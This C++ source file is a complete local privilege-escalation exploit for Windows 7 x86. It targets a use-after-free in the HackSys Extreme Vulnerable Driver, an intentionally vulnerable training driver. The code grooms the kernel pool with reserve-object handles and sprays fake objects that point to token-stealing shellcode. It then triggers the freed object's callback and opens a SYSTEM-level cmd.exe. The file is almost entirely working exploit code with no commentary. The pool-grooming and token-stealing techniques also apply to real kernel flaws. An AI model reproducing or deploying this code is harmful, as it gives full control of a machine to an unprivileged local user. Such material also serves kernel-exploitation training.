/*
Windows 7 x86
Version 6.1.7601
*/
#include <stdio.h>
#include <Windows.h>
#include <sddl.h>
#include <vector>
#include <Psapi.h>
#include <winnt.h>

#define IOCTL(Function) CTL_CODE(FILE_DEVICE_UNKNOWN, Function, METHOD_NEITHER, FILE_ANY_ACCESS)

#define HEVD_IOCTL_ALLOCATE_UAF_OBJECT_NON_PAGED_POOL            IOCTL(0x804)
#define HEVD_IOCTL_USE_UAF_OBJECT_NON_PAGED_POOL                 IOCTL(0x805)
#define HEVD_IOCTL_FREE_UAF_OBJECT_NON_PAGED_POOL                IOCTL(0x806)
#define HEVD_IOCTL_ALLOCATE_FAKE_OBJECT_NON_PAGED_POOL           IOCTL(0x807)

using namespace std;

vector<HANDLE> defragment_handles;
vector<HANDLE> sequential_handles;

#define FILEMAP_SIZE 4096
#define BUF_SIZE 532

typedef NTSTATUS(WINAPI* _NtAllocateVirtualMemory)(
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    ULONG_PTR ZeroBits,
    PSIZE_T AllocationSize,
    ULONG AllocationType,
    ULONG Protect
    );

typedef struct _LSA_UNICODE_STRING {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR Buffer;
} UNICODE_STRING;

typedef struct _OBJECT_ATTRIBUTES {
    ULONG Length;
    HANDLE RootDirectory;
    UNICODE_STRING* ObjectName;
    ULONG Attributes;
    PVOID SecurityDescriptor;
    PVOID SecurityQualityOfService;
} OBJECT_ATTRIBUTES;

#define POBJECT_ATTRIBUTES OBJECT_ATTRIBUTES*

typedef NTSTATUS(WINAPI* _NtAllocateReserveObject)(
    OUT PHANDLE hObject,
    IN POBJECT_ATTRIBUTES ObjectAttributes,
    IN DWORD ObjectType);

HANDLE create_handle() {
    HANDLE driverHandle;

    printf("[*] Opening handle to \\\\.\\HackSysExtremeVulnerableDriver\n");

    driverHandle = CreateFileA(
        "\\\\.\\HackSysExtremeVulnerableDriver",
        GENERIC_READ | GENERIC_WRITE,
        0,
        NULL,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        NULL
    );
    if (driverHandle == INVALID_HANDLE_VALUE) {
        printf("\t[-] Could not open HEVD handle\n");
        return 0;
    }
    printf("\t[+] Success to open handle\n");

    return driverHandle;
}

LPVOID kernelBase() {

    printf("[*] Preparing kernel information leak\n");

    LPVOID drivers[1000];
    DWORD cbNeeded;

    EnumDeviceDrivers(drivers, 1000, &cbNeeded);
    LPVOID kernelBaseAddr = drivers[0];
    printf("\t[+] Kernel base address @  0x%p\n", kernelBaseAddr);

    return kernelBaseAddr;
}

void allocate_uaf_obj(HANDLE driverHandle) {
    DWORD bytes_ret = 0x0;
    BYTE input_buff[] = { 0 };

    printf("[*] Allocate UAF object\n");

    DeviceIoControl(driverHandle, HEVD_IOCTL_ALLOCATE_UAF_OBJECT_NON_PAGED_POOL,
        input_buff, sizeof(input_buff), NULL, 0, &bytes_ret, NULL);

    printf("\t[+] Success to allocate UAF object\n");

}

void free_uaf_obj(HANDLE driverHandle) {
    DWORD bytes_ret = 0x0;
    BYTE input_buff[] = { 0 };

    printf("[*] Free UAF object\n");

    DeviceIoControl(driverHandle, HEVD_IOCTL_FREE_UAF_OBJECT_NON_PAGED_POOL,
        input_buff, sizeof(input_buff), NULL, 0, &bytes_ret, NULL);
    printf("\t[+] Success to free UAF object\n");
}

void use_uaf_obj(HANDLE driverHandle) {
    DWORD bytes_ret = 0x0;
    BYTE input_buff[] = { 0 };

    printf("[*] Use UAF object(UAF callback)\n");

    DeviceIoControl(driverHandle, HEVD_IOCTL_USE_UAF_OBJECT_NON_PAGED_POOL,
        input_buff, sizeof(input_buff), NULL, 0, &bytes_ret, NULL);

    printf("\t[+] Success to use UAF object\n");
}

void allocate_fake_obj(HANDLE driverHandle) {
    DWORD bytes_ret = 0x0;
    BYTE input_buff[0x58] = { 0, };

    char shellcode[67] = (
        //"\xCC"
        "\x60" // PUSHAD
        "\x64\xA1\x24\x01\x00\x00" // MOV EAX, fs:[KTHREAD_OFFSET]
        "\x8B\x40\x50" // MOV EAX, [EAX + EPROCESS_OFFSET]
        "\x89\xC1" // mov ecx, eax (Current EPROCESS structure)
        "\x8B\x98\xF8\x00\x00\x00" // mov ebx, [eax + TOKEN_OFFSET]

        "\xBA\x04\x00\x00\x00" // mov edx, 4 (SYSTEM PID)
        "\x8B\x80\xB8\x00\x00\x00" // mov eax, [eax + FLINK_OFFSET]
        "\x2D\xB8\x00\x00\x00" //               sub eax, FLINK_OFFSET 
        "\x39\x90\xB4\x00\x00\x00" //      cmp[eax + PID_OFFSET], edx 
        "\x75\xED" // jnz                                          
        "\x8B\x90\xF8\x00\x00\x00" // mov edx, [eax + TOKEN_OFFSET]
        "\x89\x91\xF8\x00\x00\x00" // mov[ecx + TOKEN_OFFSET], edx

        "\x61" // popad
        "\xC3" // RET
        );
    LPVOID shellcode_addr = VirtualAlloc(NULL,
        sizeof(shellcode),
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE);

    memcpy(shellcode_addr, shellcode, sizeof(shellcode));
    printf("[*] Success allocate shellcode\n");
    printf("\t[+] shellcode address @ %p\n", shellcode_addr);

    memcpy(input_buff, &shellcode_addr, 4);

    printf("[*] Sparying fake UAF pool\n");

    for (int i = 0; i < 20000; i++) {
        DeviceIoControl(driverHandle, HEVD_IOCTL_ALLOCATE_FAKE_OBJECT_NON_PAGED_POOL,
            input_buff, sizeof(input_buff), NULL, 0, &bytes_ret, NULL);
    }
    printf("\t[+] Success to spray fake UAF object\n");
}

void pool_spray() {
    LPVOID kernelAddr = kernelBase();

    _NtAllocateReserveObject NtAllocateReserveObject =
        (_NtAllocateReserveObject)GetProcAddress(GetModuleHandleA("ntdll.dll"),
            "NtAllocateReserveObject");

    printf("[*] Spraying pool to defragment\n");
    for (int i = 0; i < 100000; i++) {
        HANDLE hObject = 0x0;

        PHANDLE result = (PHANDLE)NtAllocateReserveObject((PHANDLE)&hObject,
            NULL,
            1); // specifies the correct object

        if (result != 0) {
            printf("\t[-] Failed to get NtAllocateReserve\n");
            exit(1);
        }
        defragment_handles.push_back(hObject);
    }
    printf("\t[+] Success to spraying pool to defragment\n");

    printf("[*] Spraying sequential pool\n");
    for (int i = 0; i < 100000; i++) {
        HANDLE hObject = 0x0;

        PHANDLE result = (PHANDLE)NtAllocateReserveObject((PHANDLE)&hObject,
            NULL,
            1); // specifies the correct object

        if (result != 0) {
            printf("\t[-] Failed to get NtAllocateReserve\n");
            exit(1);
        }
        sequential_handles.push_back(hObject);
    }
    printf("\t[+] Success to spraying sequential pool\n");

    printf("[*] Make 0x60 size hole\n");
    for (int i = 0; i < sequential_handles.size(); i++) {
        if (i % 2 == 0) {
            CloseHandle(sequential_handles[i]);
        }
    }
    printf("\t[+] Success to make hole\n");
    printf("\t\t[+] handle %d: %p\n", 90001, sequential_handles[90001]);
    printf("\t\t[+] handle %d: %p\n", 90002, sequential_handles[90002]);
    printf("\t\t[+] handle %d: %p\n", 90003, sequential_handles[90003]);

    Sleep(1000);
}

int main() {
    HANDLE driverHandle;
    LPVOID lpvPayload;

    driverHandle = create_handle();

    pool_spray();
    allocate_uaf_obj(driverHandle);
    free_uaf_obj(driverHandle);
    allocate_fake_obj(driverHandle);
    use_uaf_obj(driverHandle);

    printf("[*] Success\n");
    system("cmd.exe");
}
